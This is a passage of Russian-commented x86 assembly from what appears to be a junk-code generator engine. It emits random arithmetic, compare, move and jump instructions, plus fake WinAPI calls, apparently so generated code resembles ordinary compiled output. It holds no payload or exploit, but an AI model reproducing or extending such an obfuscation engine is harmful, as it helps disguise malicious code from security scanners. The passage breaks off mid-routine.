;AND	DL, BYTE PTR [403010h]	etc (22h XXh XXXXXXXXh)
;OR		BL, BYTE PTR [403014h]	etc (0Ah XXh XXXXXXXXh)
;SBB	AH, BYTE PTR [403018h]	etc (1Ah XXh XXXXXXXXh)
;SUB	CH, BYTE PTR [40301Ch]	etc (2Ah XXh XXXXXXXXh)
;XOR	DH, BYTE PTR [403020h]	etc (32h XXh XXXXXXXXh)
;ADC	BYTE PTR [403024h], BH	etc (10h XXh XXXXXXXXh)
;ADD	BYTE PTR [403028h], AL	etc (00h XXh XXXXXXXXh)
;AND	BYTE PTR [40302Ch], CL	etc (20h XXh XXXXXXXXh)
;OR		BYTE PTR [403030h], DL	etc (08h XXh XXXXXXXXh)
;SBB	BYTE PTR [403034h], BL	etc (18h XXh XXXXXXXXh)
;SUB	BYTE PTR [403038h], AH	etc (28h XXh XXXXXXXXh)
;XOR	BYTE PTR [40303Ch], CH	etc (30h XXh XXXXXXXXh)
;etc 
adc_add_and_or_sbb_sub_xor___r8_m8__m8_r8: 
	cmp		ecx, 06
	jl		_chk_instr_

	call	check_data													;иначе, проверим секцию данных на пригодность; 

	test	eax, eax
	je		_chk_instr_													;если там какая-то хуйня, тогда выходим; 

	push	02															;далее составляем опкод: первые 3 младших бита (0-2) могут принимать одно из 2-х значений: 0 или 2; 
	call	[ebx].rang_addr 											;следующие 3 бита (3-5) могут принимать любое значение в диапазоне [0..6];
																		;и последние 2 бита (6-7) всегда равны 0; 
	shl		eax, 01
	xchg	eax, edx

	push	07
	call	[ebx].rang_addr

	shl		eax, 03
	add		al, dl
	stosb																;opcode

	call	get_free_r8													;получаем случайный свободный рег8; 

	shl		eax, 03
	add		al, 05
	stosb																;modrm; 

	call	get_rnd_data_va												;вызываем функу получения случайного адреса, кратного четырем; 

	stosd 																;offset 
	sub		ecx, 06
	jmp		_chk_instr_ 												;отправляемся на генерацию следующей инструкции/конструкции; 
;=======================[ADC/ADD/AND/OR/SBB/SUB/XOR REG8/MEM8, MEM8/REG8]================================


	
;======================[ADC/ADD/AND/OR/SBB/SUB/XOR MEM32/MEM8, IMM32/IMM8]===============================
;ADC	DWORD PTR [403008h], 1		etc (83h XXh XXXXXXXXh XXh)
;ADD	DWORD PTR [40300Ch], 12345h	etc (81h XXh XXXXXXXXh XXXXXXXXh)
;AND	BYTE PTR  [403010h], 05		etc (80h XXh XXXXXXXXh XXh)
;etc
adc_add_and_or_sbb_sub_xor___m32_m8__imm32_imm8:

OFS_AAAOSSX_m_imm_83h	equ	08
OFS_AAAOSSX_m_imm_81h	equ	01
OFS_AAAOSSX_m_imm_80h	equ	01

;OFS_ADD_m_imm		equ		35
;OFS_SUB_m_imm		equ		25
;OFS_AND_m_imm		equ		15
;OFS_AAAOSSX_m_imm	equ		15 

	cmp		ecx, 10														;если кол-во оставшихся байт для записи/генерации трэша < 10, выходим; 
	jl		_chk_instr_

	call	check_data													;иначе, проверим секцию данных на пригодность; 

	test	eax, eax
	je		_chk_instr_													;если там какая-то хуйня, тогда выходим; 

	mov		eax, 10000h													;далее, получим СЧ;
	call	get_rnd_num_1

	lea		esi, dword ptr [eax + 101h]									;сохраним его в esi и добавим 101h;
	xor		edx, edx  

	push	(OFS_AAAOSSX_m_imm_83h + OFS_AAAOSSX_m_imm_81h + OFS_AAAOSSX_m_imm_80h)
	call	[ebx].rang_addr												;затем, используя стату, "случайно" определим, какую конкретно команду будем генерить; 

	cmp		eax, OFS_AAAOSSX_m_imm_80h
	jl		_aaaossx_m_imm_80h_
	cmp		eax, (OFS_AAAOSSX_m_imm_80h + OFS_AAAOSSX_m_imm_81h)
	jge		_aaaossx_m_imm_83h_
_aaaossx_m_imm_81h_:													;[ADC/etc MEM32, IMM32]
	mov		al, 81h
	add		edx, 03
	jmp		_aaaossx_m_imm_nxt_1_
_aaaossx_m_imm_83h_:													;[ADC/etc MEM32, IMM8]
	mov		al, 83h
	jmp		_aaaossx_m_imm_nxt_1_
_aaaossx_m_imm_80h_:													;[ADC/etc MEM8, IMM8]
	mov		al, 80h
_aaaossx_m_imm_nxt_1_:
	stosb																;opcode 

	push	07															;теперь определим, какую будем генерить: ADC, ADD, AND etc ? 
	call	[ebx].rang_addr

	shl		eax, 03
	add		al, 05
	stosb																;modrm

	call	get_rnd_data_va												;получим случайный адрес в секции данных
	
	stosd																;offset
	inc		edx															;edx = 1 или 4; 
	sub		ecx, edx													;отнимаем от ecx либо 7 либо 10 (смотря, какую команду генерируем); 
	sub		ecx, 06
	xchg	eax, esi
_aaaossx_m_imm_stosX_:
	stosb																;imm 
	ror		eax, 08
	dec		edx
	jne		_aaaossx_m_imm_stosX_ 
	jmp		_chk_instr_
;======================[ADC/ADD/AND/OR/SBB/SUB/XOR MEM32/MEM8, IMM32/IMM8]===============================



;================================[CMP REG32/MEM32, MEM32/REG32]==========================================
;CMP	EAX, DWORD PTR [403008h]	etc (3Bh XXh XXXXXXXXh)
;CMP	DWORD PTR [403008h], ECX	etc (39h XXh XXXXXXXXh) 
cmp___r32_m32__m32_r32:

OFS_CMP_3Bh_r32m32_m32r32	equ	35
OFS_CMP_39h_r32m32_m32r32	equ	25

	mov		eax, (300h - 06)											;далее, получим СЧ;
	call	get_rnd_num_1 

	add		eax, 06														;СЧ >= 6, чтобы полюбому хотя бы одна команда была сгенерена (важно для логики 6 байт!); 
	mov		edx, eax
	add		eax, (06 + 06)	
	cmp		ecx, eax													;если кол-во оставшихся байтов < 30Ch, тогда выходим
	jl		_chk_instr_

	call	check_data													;иначе, проверим секцию данных на пригодность; 

	test	eax, eax
	je		_chk_instr_													;если там какая-то хуйня, тогда выходим; 

	push	(OFS_CMP_3Bh_r32m32_m32r32 + OFS_CMP_39h_r32m32_m32r32)
	call	[ebx].rang_addr

	cmp		eax, OFS_CMP_39h_r32m32_m32r32
	jl		_cmp_39h_r32m32_m32r32_
_cmp_3Bh_r32m32_m32r32_:												;[MOV REG32, MEM32]
	mov		al, 3Bh
	jmp		_cmp_3Bh_39h_
_cmp_39h_r32m32_m32r32_:												;[MOV MEM32, REG32]
	mov		al, 39h
_cmp_3Bh_39h_:
	stosb																;opcode

	call	get_free_r32												;get free reg32

	shl		eax, 03
	add		al, 05
	stosb																;modrm (mod = 0);

	call	get_rnd_data_va												;получим случайный адрес в секции данных
	
	stosd																;offset
	sub		ecx, 06
	cmp		edx, 80h													;и определяем, на генерацию какого перехода прыгнем (short or near); 
	jl		_jsdrel8_entry_ 
	jmp		_jndrel32_entry_	
;================================[CMP REG32/MEM32, MEM32/REG32]==========================================



;=================================[CMP MEM32/MEM8, IMM32/IMM8]===========================================
;CMP	DWORD PTR [403008h], 1		etc (83h XXh XXXXXXXXh XXh)
;CMP	DWORD PTR [40300Ch], 12345h	etc (81h XXh XXXXXXXXh XXXXXXXXh)
;CMP	BYTE PTR  [403010h], 05		etc (80h XXh XXXXXXXXh XXh)
;etc
cmp___m32_m8__imm32_imm8:

OFS_CMP_m_imm_83h	equ	35
OFS_CMP_m_imm_81h	equ	15
OFS_CMP_m_imm_80h	equ	05 

	mov		eax, (300h - 06)											;получим СЧ;
	call	get_rnd_num_1 

	add		eax, 06														;etc 
	mov		edx, eax
	add		eax, (10 + 06)	
	cmp		ecx, eax													;если кол-во оставшихся байтов < 310h, тогда выходим
	jl		_chk_instr_
	
	call	check_data													;иначе, проверим секцию данных на пригодность; 

	test	eax, eax
	je		_chk_instr_													;если там какая-то хуйня, тогда выходим; 
	push	edx

	mov		eax, 10000h													;далее, получим СЧ;
	call	get_rnd_num_1

	lea		esi, dword ptr [eax + 101h]									;сохраним его в esi и добавим 101h (так как пока неясно, будет это опкод 83h или 81h); 
	xor		edx, edx  

	push	(OFS_CMP_m_imm_83h + OFS_CMP_m_imm_81h + OFS_CMP_m_imm_80h)
	call	[ebx].rang_addr												;затем, используя стату, "случайно" определим, какую конкретно команду будем генерить; 

	cmp		eax, OFS_CMP_m_imm_80h
	jl		_cmp_m_imm_80h_
	cmp		eax, (OFS_CMP_m_imm_80h + OFS_CMP_m_imm_81h)
	jge		_cmp_m_imm_83h_
_cmp_m_imm_81h_:														;[CMP MEM32, IMM32]
	mov		al, 81h
	add		edx, 03
	jmp		_cmp_m_imm_nxt_1_
_cmp_m_imm_83h_:														;[CMP MEM32, IMM8]
	mov		al, 83h
	jmp		_cmp_m_imm_nxt_1_
_cmp_m_imm_80h_:														;[CMP MEM8, IMM8]
	mov		al, 80h
_cmp_m_imm_nxt_1_:
	stosb																;opcode 

	mov		al, 3Dh
	stosb

	call	get_rnd_data_va												;получим случайный адрес в секции данных
	
	stosd																;offset
	inc		edx															;edx = 1 или 4; 
	sub		ecx, edx													;отнимаем от ecx либо 7 либо 10 (смотря, какую команду генерируем); 
	sub		ecx, 06
	xchg	eax, esi
_cmp_m_imm_stosX_:
	stosb																;imm 
	ror		eax, 08
	dec		edx
	jne		_cmp_m_imm_stosX_ 
	pop		edx 
	cmp		edx, 80h													;и определяем, на генерацию какого перехода прыгнем (short or near); 
	jl		_jsdrel8_entry_ 
	jmp		_jndrel32_entry_		
;=================================[CMP MEM32/MEM8, IMM32/IMM8]===========================================



;=============================[MOV/LEA REG32, DWORD PTR [ebp +- XXh]]==================================== 
;MOV	EAX, DWORD PTR [EBP - 04]	etc	(8Bh XXh XXh)
;MOV	ECX, DWORD PTR [EBP + 04]	etc	(8Bh XXh XXh)
;LEA	EDX, DWORD PTR [EBP - 08]	etc (8Dh XXh XXh)
;LEA	EBX, DWORD PTR [EBP + 08]	etc (8Dh XXh XXh) 
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь нужный код; 
mov_lea___r32__m32ebpo8:

OFS_MOV_r32_m32ebpo8_8Bh		equ		50
OFS_LEA_r32_m32ebpo8_8Dh		equ		20

	cmp		ecx, 03														;если кол-во оставшихся байт для записи трэша меньше 3-х, тогда выходим; 
	jl		_chk_instr_

	call	check_local_param_num										;иначе, выберем случайно либо локальные переменные, либо входные параметры и проверим тщательно один из этих вариантов; 

	inc		eax
	je		_chk_instr_													;если eax == -1, то на выход; 
	dec		eax
	xchg	eax, edx
	mov		esi, [ebx].xfunc_struct_addr

	push	(OFS_MOV_r32_m32ebpo8_8Bh + OFS_LEA_r32_m32ebpo8_8Dh) 
	call	[ebx].rang_addr

	cmp		eax, OFS_LEA_r32_m32ebpo8_8Dh
	jl		_lea_r32_m32ebpo8_
_mov_r32_m32ebpo8_:														;[MOV REG32, DWORD PTR [EBP +- XXh]]
	mov		al, 8Bh
	jmp		_ml_rm_ebpo8_nxt_1_ 
_lea_r32_m32ebpo8_:														;[LEA REG32, DWORD PTR [EBP +- XXh]] 
	mov		al, 8Dh
_ml_rm_ebpo8_nxt_1_:
	stosb																;opcode (1 byte); 

	call	get_free_r32												;получаем случайный свободный рег32

	shl		eax, 03
	add		al, 45h
	stosb																;modrm (2 byte);
	test	edx, edx
	je		_ml_rm_ebpo8_gl_

_ml_rm_ebpo8_gp_:														;generate param;
	call	get_moffs8_ebp_param

	stosb
	jmp		_ml_rm_ebpo8_nxt_2_

_ml_rm_ebpo8_gl_:														;generate local;
	call	get_moffs8_ebp_local

	stosb																;moffs8 (3 byte) - mem offset8; ebpo8 - ebp offset8; 
_ml_rm_ebpo8_nxt_2_:
	sub		ecx, 03														;корректируем счётчик; 
	jmp		_chk_instr_ 
;=============================[MOV/LEA REG32, DWORD PTR [ebp +- XXh]]====================================



;==============================[MOV DWORD PTR [ebp +- XXh], REG32]=======================================
;MOV	DWORD PTR [EBP - 04], EAX	etc	(89h XXh XXh)
;MOV	DWORD PTR [EBP + 04], ECX	etc (89h XXh XXh)
;etc 
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь нужный код; 
mov___m32ebpo8__r32:
	cmp		ecx, 03														;etc
	jl		_chk_instr_

	call	check_local_param_num										;etc

	inc		eax
	je		_chk_instr_
	dec		eax
	xchg	eax, edx
	mov		esi, [ebx].xfunc_struct_addr
	mov		al, 89h
	stosb

	call	get_free_r32

	shl		eax, 03
	add		al, 45h
	stosb
	test	edx, edx
	je		_ml_mr_ebpo8_gl_

_ml_mr_ebpo8_gp_:
	call	get_moffs8_ebp_param

	stosb
	jmp		_ml_mr_ebpo8_nxt_2_

_ml_mr_ebpo8_gl_:
	call	get_moffs8_ebp_local

	stosb
_ml_mr_ebpo8_nxt_2_: 
	sub		ecx, 03														;etc 
	jmp		_chk_instr_
;==============================[MOV DWORD PTR [ebp +- XXh], REG32]=======================================


 
;==============================[MOV DWORD PTR [ebp +- XXh], IMM32]=======================================
;MOV	DWORD PTR [EBP - 08h], 01			etc	(0C7h 45h XXh XXXXXXXXh)
;MOV	DWORD PTR [EBP + 14h], 05			etc (0C7h 45h XXh XXXXXXXXh)
;MOV	DWORD PTR [EBP - 1Ch], 12345678h	etc	(0C7h 45h XXh XXXXXXXXh)
;etc
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь нужный код; 
mov___m32ebpo8__imm32:
	cmp		ecx, 07														;если кол-во оставшихся байтов меньше 7, тогда выходим
	jl		_chk_instr_

	call	check_local_param_num										;иначе, выберем случайно либо локальные переменные, либо входные параметры и проверим тщательно один из этих вариантов; 

	inc		eax
	je		_chk_instr_													;если eax == -1, то на выход; 
	dec		eax
	xchg	eax, edx
	mov		ax, 45C7h													;write 2 bytes; 
	stosw

	xchg	eax, edx													;eax = 0 либо 4;
	call	write_moffs8_for_ebp										;сгенерим и запишем локальную переменную или входной параметр для ebp, например, [ebp - 14h] или [ebp + 1Ch] - -14h - локальная переменная, а 1Ch - входной параметр; 

	mov		eax, 1000h													;сгенерим СЧ; 
	call	get_rnd_num_1

	inc		eax															;СЧ >= 1;
	stosd																;запишем его
	sub		ecx, 07														;скорректируем счётчик
	jmp		_chk_instr_ 												;и выйдем; 
;==============================[MOV DWORD PTR [ebp +- XXh], IMM32]=======================================

 

;====================[ADC/ADD/AND/OR/SBB/SUB/XOR REG32, DWORD PTR [ebp +- XXh]]==========================
;ADC	EAX, DWORD PTR [EBP - 04h]	etc	(13h XXh XXh)
;ADD	ECX, DWORD PTR [EBP + 08h]	etc (03h XXh XXh)
;AND	EDX, DWORD PTR [EBP - 0Ch]	etc	(23h XXh XXh)
;OR		EBX, DWORD PTR [EBP + 10h]	etc (0Bh XXh XXh)
;SBB	ESI, DWORD PTR [EBP - 14h]	etc (1Bh XXh XXh)
;SUB	EDI, DWORD PTR [EBP + 18h]	etc (2Bh XXh XXh)
;XOR	EAX, DWORD PTR [EBP - 1Ch]	etc (33h XXh XXh)
;etc
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь нужный код; 
adc_add_and_or_sbb_sub_xor___r32__m32ebpo8:

OFS_XOR_33h_r32_m32ebpo8		equ		05
OFS_ADD_03h_r32_m32ebpo8		equ		55
OFS_SUB_2Bh_r32_m32ebpo8		equ		35
OFS_AAAOSSX_r32_m32ebpo8		equ		05

	cmp		ecx, 03
	jl		_chk_instr_

	call	check_local_param_num										;иначе, выберем случайно либо локальные переменные, либо входные параметры и проверим тщательно один из этих вариантов; 

	inc		eax
	je		_chk_instr_													;если eax == -1, то на выход; 
	dec		eax
	xchg	eax, edx

	push	(OFS_XOR_33h_r32_m32ebpo8 + OFS_ADD_03h_r32_m32ebpo8 + OFS_SUB_2Bh_r32_m32ebpo8 + OFS_AAAOSSX_r32_m32ebpo8) 
	call	[ebx].rang_addr

	cmp		eax, OFS_AAAOSSX_r32_m32ebpo8
	jl		_aaaossx_r32_m32ebpo8_
	cmp		eax, (OFS_AAAOSSX_r32_m32ebpo8 + OFS_SUB_2Bh_r32_m32ebpo8)
	jl		_sub_r32_m32ebpo8_
	cmp		eax, (OFS_AAAOSSX_r32_m32ebpo8 + OFS_SUB_2Bh_r32_m32ebpo8 + OFS_ADD_03h_r32_m32ebpo8)
	jge		_xor_r32_m32ebpo8_
_add_r32_m32ebpo8_:														;[ADD REG32, DWORD PTR [EBP +- XXh]]
	mov		al, 03h
	jmp		_aaaossx_r32_m32ebpo8_nxt_1_
_xor_r32_m32ebpo8_:														;[XOR REG32, DWORD PTR [EBP +- XXh]]
	mov		al, 33h
	jmp		_aaaossx_r32_m32ebpo8_nxt_1_
_sub_r32_m32ebpo8_:														;[SUB REG32, DWORD PTR [EBP +- XXh]]
	mov		al, 2Bh
	jmp		_aaaossx_r32_m32ebpo8_nxt_1_
_aaaossx_r32_m32ebpo8_:													;все остальные опкоды, доступные в данной конструкции/группе; 
	push	07
	call	[ebx].rang_addr

	shl		eax, 03
	add		al, 03
_aaaossx_r32_m32ebpo8_nxt_1_:
	stosb																;opcode

	call	get_free_r32

	shl		eax, 03
	add		al, 45h
	stosb 																;modrm

	xchg	eax, edx													;eax = 0 либо 4;
	call	write_moffs8_for_ebp										;сгенерим и запишем локальную переменную или входной параметр для ebp, например, [ebp - 14h] или [ebp + 1Ch] - -14h - локальная переменная, а 1Ch - входной параметр; 

	sub		ecx, 03														;корректируем счётчик
	jmp		_chk_instr_ 												;на выход 
;====================[ADC/ADD/AND/OR/SBB/SUB/XOR REG32, DWORD PTR [ebp +- XXh]]==========================



;====================[ADC/ADD/AND/OR/SBB/SUB/XOR DWORD PTR [ebp +- XXh], REG32]==========================
;ADC	DWORD PTR [EBP + 04h], EAX	etc (11h XXh XXh)
;ADD	DWORD PTR [EBP - 08h], ECX	etc (01h XXh XXh)
;AND	DWORD PTR [EBP + 0Ch], EDX	etc (21h XXh XXh)
;OR		DWORD PTR [EBP - 10h], EBX	etc	(09h XXh XXh)
;SBB	DWORD PTR [EBP + 14h], ESI	etc (19h XXh XXh)
;SUB	DWORD PTR [EBP - 18h], EDI	etc (29h XXh XXh)
;XOR	DWORD PTR [EBP + 1Ch], EAX	etc (31h XXh XXh)
;etc
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь нужный код; 
adc_add_and_or_sbb_sub_xor___m32ebpo8__r32:

OFS_XOR_33h_m32ebpo8_r32		equ		05
OFS_ADD_03h_m32ebpo8_r32		equ		55
OFS_SUB_2Bh_m32ebpo8_r32		equ		35
OFS_AAAOSSX_m32ebpo8_r32		equ		05

	cmp		ecx, 03														;если кол-во оставшихся байтов для генерации трэша меньше 3, тогда выходим 
	jl		_chk_instr_

	call	check_local_param_num										;иначе, выберем случайно либо локальные переменные, либо входные параметры и проверим тщательно один из этих вариантов; 

	inc		eax
	je		_chk_instr_													;если eax == -1, то на выход; 
	dec		eax
	xchg	eax, edx

	push	(OFS_XOR_33h_m32ebpo8_r32 + OFS_ADD_03h_m32ebpo8_r32 + OFS_SUB_2Bh_m32ebpo8_r32 + OFS_AAAOSSX_m32ebpo8_r32)
	call	[ebx].rang_addr

	cmp		eax, OFS_AAAOSSX_m32ebpo8_r32
	jl		_aaaossx_m32ebpo8_r32_
	cmp		eax, (OFS_AAAOSSX_m32ebpo8_r32 + OFS_SUB_2Bh_m32ebpo8_r32)
	jl		_sub_m32ebpo8_r32_
	cmp		eax, (OFS_AAAOSSX_m32ebpo8_r32 + OFS_SUB_2Bh_m32ebpo8_r32 + OFS_ADD_03h_m32ebpo8_r32)
	jge		_xor_m32ebpo8_r32_
_add_m32ebpo8_r32_:														;[ADD DWORD PTR [EBP +- XX], REG32]
	mov		al, 01h
	jmp		_aaaossx_m32ebpo8_r32_nxt_1_
_xor_m32ebpo8_r32_:														;[XOR DWORD PTR [EBP +- XX], REG32]
	mov		al, 31h 
	jmp		_aaaossx_m32ebpo8_r32_nxt_1_
_sub_m32ebpo8_r32_:														;[SUB DWORD PTR [EBP +- XX], REG32]
	mov		al, 29h
	jmp		_aaaossx_m32ebpo8_r32_nxt_1_
_aaaossx_m32ebpo8_r32_:													;other + this is; 
	push	07
	call	[ebx].rang_addr
	
	shl		eax, 03
	add		al, 01
_aaaossx_m32ebpo8_r32_nxt_1_:
	stosb																;opcode

	call	get_free_r32												;получаем случайный свободный рег; 

	shl		eax, 03
	add		al, 45h
	stosb																;modrm

	xchg	eax, edx													;eax = 0 либо 4;
	call	write_moffs8_for_ebp										;сгенерим и запишем локальную переменную или входной параметр для ebp, например, [ebp - 14h] или [ebp + 1Ch] - -14h - локальная переменная, а 1Ch - входной параметр; 

	sub		ecx, 03														;корректируем счётчик
	jmp		_chk_instr_ 												;на выход 
;====================[ADC/ADD/AND/OR/SBB/SUB/XOR DWORD PTR [ebp +- XXh], REG32]==========================
 


;==================[ADC/ADD/AND/OR/SBB/SUB/XOR DWORD PTR [ebp +- XXh], IMM32/IMM8]=======================
;ADC	DWORD PTR [EBP + 04h], 01		etc (83h XXh XXh XXh)
;ADD	DWORD PTR [EBP - 08h], 123h		etc (81h XXh XXh XXXXXXXXh)
;etc
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь нужный код; 
adc_add_and_or_sbb_sub_xor___m32ebpo8__imm32_imm8:
																		;m32ebpo8 - mem32 ebp offset32
OFS_AAAOSSX_83h_m32ebpo8_imm8		equ		35							
OFS_AAAOSSX_81h_m32ebpo8_imm32		equ		15

	cmp		ecx, 07														;если кол-во оставшихся байтов для генерации трэша меньше 3, тогда выходим 
	jl		_chk_instr_

	call	check_local_param_num										;иначе, выберем случайно либо локальные переменные, либо входные параметры и проверим тщательно один из этих вариантов; 

	inc		eax
	je		_chk_instr_													;если eax == -1, то на выход; 
	dec		eax
	xchg	eax, edx
	xor		esi, esi

	push	(OFS_AAAOSSX_83h_m32ebpo8_imm8 + OFS_AAAOSSX_81h_m32ebpo8_imm32)
	call	[ebx].rang_addr
	
	cmp		eax, OFS_AAAOSSX_81h_m32ebpo8_imm32 
	jl		_81h_m32ebpo8_imm32_
_83h_m32ebpo8_imm8_:													;[ADC/etc DWORD PTR [EBP +- XXh], XXh]
	mov		al, 83h
	jmp		_m32ebpo8_imm_
_81h_m32ebpo8_imm32_: 													;[ADC/etc DWORD PTR [EBP +- XXh], XXXXXXXXh] 
	mov		al, 81h 
	add		esi, 03
_m32ebpo8_imm_:
	stosb																;opcode

	push	07
	call	[ebx].rang_addr

	shl		eax, 03
	add		al, 45h
	stosb																;modrm

	xchg	eax, edx													;eax = 0 либо 4;
	call	write_moffs8_for_ebp										;сгенерим и запишем локальную переменную или входной параметр для ebp, например, [ebp - 14h] или [ebp + 1Ch] - -14h - локальная переменная, а 1Ch - входной параметр; 

	mov		eax, 10000h
	call	get_rnd_num_1

 	add		eax, 101h 													;так как мы еще не знаем, какой imm будет (8 или 32), то на всякий сделаем eax и под imm8 и под imm32; 
	inc		esi
	xchg	edx, esi 
	sub		ecx, edx
	sub		ecx, 03
_m32ebpo8_imm_stosX_:
	stosb																;imm (8-ми или 32-х разрядное); 
	ror		eax, 08
	dec		edx
	jne		_m32ebpo8_imm_stosX_ 
	jmp		_chk_instr_													;на выход; 
;==================[ADC/ADD/AND/OR/SBB/SUB/XOR DWORD PTR [ebp +- XXh], IMM32/IMM8]=======================
 


;==================[CMP REG32/DWORD PTR [EBP +- XXh], DWORD PTR [EBP +- XXh]/REG32]======================
;CMP	EAX, DWORD PTR [EBP - 04h]	etc (3Bh XXh XXh)
;CMP	DWORD PTR [EBP + 08h], ECX	etc (39h XXh XXh)
;etc
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь нужный код; 
cmp___r32_m32ebpo8__m32ebpo8_r32:

OFS_CMP_3Bh_r32_m32ebpo8	equ		35
OFS_CMP_39h_m32ebpo8_r32	equ		20

	mov		eax, (300h - 06)
	call	get_rnd_num_1

	add		eax, 06														;определяем размер трэша между адресом jxx'a и адресом, куда будет совершён прыжок; размер всегда >= 6; 
	mov		edx, eax
	add		eax, (03 + 06)												;size of cmp (this instr) + max size of jxx (near); 
	cmp		ecx, eax
	jl		_chk_instr_													;если кол-во оставшихся для записи трэша юайтов меньше нужного числа, тогда выходим

	call	check_local_param_num										;иначе, выберем случайно либо локальные переменные, либо входные параметры и проверим тщательно один из этих вариантов; 

	inc		eax
	je		_chk_instr_													;если eax == -1, то на выход; 
	dec		eax
	xchg	eax, esi													;сохраним значение в esi;

	push	(OFS_CMP_3Bh_r32_m32ebpo8 + OFS_CMP_39h_m32ebpo8_r32)
	call	[ebx].rang_addr                               

	cmp		eax, OFS_CMP_39h_m32ebpo8_r32
	jl		_cmp_39h_m32ebpo8_r32_
_cmp_3Bh_r32_m32ebpo8_:													;[CMP REG32, DWORD PTR [EBP +- XX]]
	mov		al, 3Bh
	jmp		_cmp_rmmr_ebpo8_
_cmp_39h_m32ebpo8_r32_:													;[CMP DWORD PTR [EBP +- XX], REG32]
	mov		al, 39h
_cmp_rmmr_ebpo8_: 
	stosb																;opcode

	call	get_free_r32

	shl		eax, 03
	add		al, 45h
	stosb																;modrm

	xchg	eax, esi													;eax = 0 либо 4;
	call	write_moffs8_for_ebp										;сгенерим и запишем локальную переменную или входной параметр для ebp, например, [ebp - 14h] или [ebp + 1Ch] - -14h - локальная переменная, а 1Ch - входной параметр; 

	sub		ecx, 03														;корректируем счётчик
	cmp		edx, 80h													;и определяем, на генерацию какого перехода прыгнем (short or near); 
	jl		_jsdrel8_entry_ 											;обязательно число должно быть в EDX, так как в конструкциях для прыжков кол-во байтов передаётся в edx;  
	jmp		_jndrel32_entry_											;etc
;==================[CMP REG32/DWORD PTR [EBP +- XXh], DWORD PTR [EBP +- XXh]/REG32]======================



;===========================[CMP DWORD PTR [EBP +- XXh], IMM32/IMM8]=====================================
;CMP	DWORD PTR [EBP - 04h], 01		etc (83h XXh XXh XXh)
;CMP	DWORD PTR [EBP + 08h], 123h		etc (81h XXh XXh XXXXXXXXh) 
;etc
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь нужный код; 
cmp___m32ebpo8__imm32_imm8:

OFS_CMP_83h_m32ebpo8_imm8	equ		35
OFS_CMP_81h_m32ebpo8_imm32	equ		15

	mov		eax, (300h - 06)											;!!!!! для любых cmp etc делать 6 байтов! 
	call	get_rnd_num_1

	add		eax, 06														;определяем размер трэша между адресом jxx'a и адресом, куда будет совершён прыжок; размер всегда >= 6; 
	mov		edx, eax
	add		eax, (07 + 06)												;size of cmp (this instr) + max size of jxx (near); 
	cmp		ecx, eax
	jl		_chk_instr_													;если кол-во оставшихся для записи трэша юайтов меньше нужного числа, тогда выходим

	call	check_local_param_num										;иначе, выберем случайно либо локальные переменные, либо входные параметры и проверим тщательно один из этих вариантов; 

	inc		eax
	je		_chk_instr_													;если eax == -1, то на выход; 
	dec		eax
	push	eax
	xor		esi, esi

	push	(OFS_CMP_83h_m32ebpo8_imm8 + OFS_CMP_81h_m32ebpo8_imm32)
	call	[ebx].rang_addr

	cmp		eax, OFS_CMP_81h_m32ebpo8_imm32
	jl		_cmp_81h_m32ebpo8_imm32_
_cmp_83h_m32ebpo8_imm8_:												;[CMP DWORD PTR [EBP +- XXh], IMM8]
	mov		al, 83h
	jmp		_cmp_83h_81h_m32ebpo8_imm_
_cmp_81h_m32ebpo8_imm32_:												;[CMP DWORD PTR [EBP +- XXh], IMM32]
	mov		al, 81h
	add		esi, 03
_cmp_83h_81h_m32ebpo8_imm_:
	stosb																;opcode (1 byte); 
	mov		al, 7Dh
	stosb																;modrm

	pop		eax															;eax = 0 либо 4;
	call	write_moffs8_for_ebp										;сгенерим и запишем локальную переменную или входной параметр для ebp, например, [ebp - 14h] или [ebp + 1Ch] - -14h - локальная переменная, а 1Ch - входной параметр; 

	mov		eax, 10000h
	call	get_rnd_num_1

	inc		esi
	add		eax, 101h													;СЧ >= 101h
	sub		ecx, esi
	sub		ecx, 03
_cmp_m32ebpo8_imm_stosX_:
	stosb																;imm (8 or 32); 
	ror		eax, 08
	dec		esi
	jne		_cmp_m32ebpo8_imm_stosX_
	cmp		edx, 80h													;и определяем, на генерацию какого перехода прыгнем (short or near); 
	jl		_jsdrel8_entry_ 											;обязательно число должно быть в EDX, так как в конструкциях для прыжков кол-во байтов передаётся в edx;  
	jmp		_jndrel32_entry_											;etc
;===========================[CMP DWORD PTR [EBP +- XXh], IMM32/IMM8]=====================================

 

;=====================================[FAKE WINAPI FUNC]=================================================
;call	dword ptr [402008]	etc	(0FFh XXh XXXXXXXXh) 					;например, это мог быть вызов GetVersion etc; 

;push	403008h															;address of string; 
;call	lstrlenA
;
;etc 
xwinapi_func:
	cmp		ecx, WINAPI_MAX_SIZE										;сначала проверимЮ хватит ли нам оставшихся байтов для генерации фэйкового вызова винапишки; 
	jl		_chk_instr_ 
	mov		edx, [ebx].faka_struct_addr
	assume	edx: ptr FAKA_FAKEAPI_GEN 
	cmp		[ebx].faka_addr, 0											;теперь проверим, передан ли адрес на движок генерации фэйковых винапишек (например, FAKA); 
	je		_chk_instr_
	test	edx, edx 													;передана ли структура, необходимая для правильной работы генератора фэйк-винапи
	je		_chk_instr_               
	mov		esi, [edx].xfunc_struct_addr
	cmp		[ebx].fmode, XTG_REALISTIC									;теперь посмотрим, какой сейчас юзается режим генерации команд
																		;тут вот какая фича: если режим XTG_MASK, и мы здесь - значит данную команду точно можно генерить (конечн, если еще и параметры правильные);
																		;если же это режим XTG_REALISTIC, тогда нужно еще проверить, выставлен ли спец-флаг для генерации винапишек?
																		;для винапи данные в таблице размеров команд и статы их опкодов, а также в таблице переходов расположены под каким-то номером. 
																		;Пускай это будет #45. Так вот, если был включен XTG_MASK и флаг XTG_MASK_WINAPI (а у него #45), тогда точно можно генерить винапи, 
																		;так как номера одинаковые 45 == 45. Если же был режим XTG_REALISTIC, но не было флага XTG_REALISTIC_WINAPI, и мы его не будем проверять именно так, как здесь, 
																		;тогда винапи будут генерироваться. Если же проверять спец. образом (как здесь) данный флаг, тогда всё чики-пуки; 
	jne		_xwf_nxt1_
	test	[ebx].xmask1, XTG_REALISTIC_WINAPI
	je		_chk_instr_
